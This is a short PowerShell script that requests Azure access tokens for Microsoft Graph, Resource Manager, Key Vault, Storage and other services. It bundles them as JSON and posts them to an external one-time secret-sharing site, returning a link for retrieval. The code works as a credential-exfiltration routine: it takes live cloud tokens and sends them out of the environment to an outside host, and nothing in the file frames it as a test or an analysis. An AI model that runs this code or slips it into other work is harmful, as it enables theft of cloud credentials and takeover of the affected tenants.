$ResourceTypeNames = @("MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", "Batch")
$OutputFile = "accesstokens.json"

try {
    $tokens = @()

    foreach ($resourceTypeName in $ResourceTypeNames) {
        try {
            $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName)

            $tokenObject = [PSCustomObject]@{
                Resource = $resourceTypeName
                Token    = $accessToken
            }
            $tokens += $tokenObject
        }
        catch {
            Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
        }
    }

    $requestParam = @{
        Uri         = 'https://us.onetimesecret.com/api/v1/share'
        Method      = 'POST'
        Body        = @{
            secret = $tokens | ConvertTo-Json -Depth 10
            ttl    = 3600
        }
    }
    
    $response = Invoke-RestMethod @requestParam
    return "https://us.onetimesecret.com/secret/$($response.secret_key)"
}
catch {
    Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
}
